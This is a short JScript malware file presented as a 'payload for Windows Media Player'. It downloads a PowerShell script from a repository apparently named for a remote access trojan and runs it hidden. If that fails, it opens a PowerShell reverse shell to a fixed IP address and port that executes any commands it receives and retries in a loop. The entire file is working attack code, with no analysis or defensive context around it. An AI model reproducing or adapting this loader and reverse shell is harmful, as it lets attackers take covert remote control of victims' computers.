// media.js - JavaScript payload for Windows Media Player
try {
  var ws = new ActiveXObject("WScript.Shell");
  var xhr = new ActiveXObject("MSXML2.XMLHTTP");
  
  // Download and execute PowerShell payload
  xhr.open("GET", "https://raw.githubusercontent.com/yourusername/ratrepo/main/payload.ps1", false);
  xhr.send();
  
  if(xhr.status == 200) {
    ws.Run('powershell -w h -c "' + xhr.responseText + '"', 0);
  }
} catch(e) {
  // Fallback to direct command
  ws.Run('powershell -w h -c "$s=\'192.168.0.250\';while(1){try{$c=New-Object Net.Sockets.TCPClient($s,6767);$st=$c.GetStream();$b=New-Object Byte[] 1024;while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$by=[Text.Encoding]::ASCII.GetBytes($o);$st.Write($by,0,$by.Length)};$c.Close()}catch{Start-Sleep 30}}"', 0);
}
